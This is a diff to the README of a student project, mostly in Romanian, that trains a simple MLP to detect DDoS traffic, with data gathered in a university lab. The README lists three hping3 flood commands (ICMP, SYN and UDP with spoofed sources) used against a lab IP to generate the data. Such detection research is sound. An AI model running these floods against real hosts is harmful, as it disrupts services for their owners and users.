@@ -21,7 +21,7 @@ EN: This project aimed to create a simple neural network (MLP), capable of detec
 
 Acest proiect implementează un sistem de detecție a atacurilor DDoS folosind o rețea neuronală de tip MLP (Multi-Layer Perceptron). Sistemul este capabil să detecteze pachete de rețea malițioase pe baza unor caracteristici cheie din pachetele care constituie traficul de retea. Vom nota cu 1 pachetele (liniile) malitioase, malgine, și cu 0 cele benigne.
 
-Atentie! Aceasta aplicatie nu este menita sa simuleze un IDS functional 100%, nici o retea neuronala sofisticata. Am vrut sa vedem care este minimul necesar d.p.d.v. software (resurse, arhitectura) pentru detectia unui astfel de atac.
+Atentie! Aceasta aplicatie nu este menita sa simuleze un IDS functional 100%, nici o retea neuronala sofisticata. Am vrut sa vedem care este minimul necesar d.p.d.v. software (resurse, arhitectura) pentru detectia unui astfel de atac. Astfel, este posibil sa intalnim atat rezultate bune, cat si deficitare (mai ales ca setul de date este creat de la 0).
 
 Setul de date este rezultatul procesării datelor colectate în urma unui experiment rulat în Lab. 301 (CISCO Lab), din cadrul UMFST Tg. Mures. Am folosit hping3 pentru a simula 3 tipuri majore de atac DoS:
 
@@ -32,14 +32,23 @@ Setul de date este rezultatul procesării datelor colectate în urma unui experi
 ## Script atac
 
 #!/bin/bash
+
 	# ICMP:
+ 
 hping3 -i u10000 -c 100000 -1 192.168.0.201
+
 	# TCP:
+ 
 hping3 -S -p 80 --flood 192.168.0.201
+
 	# UDP:
+ 
 hping3 --udp --flood --rand-source -p 53 192.168.0.201
 
 
+## Topologia retelei 
+
+![screenshot1](images/A-301-victim.png)
 
 ---
 
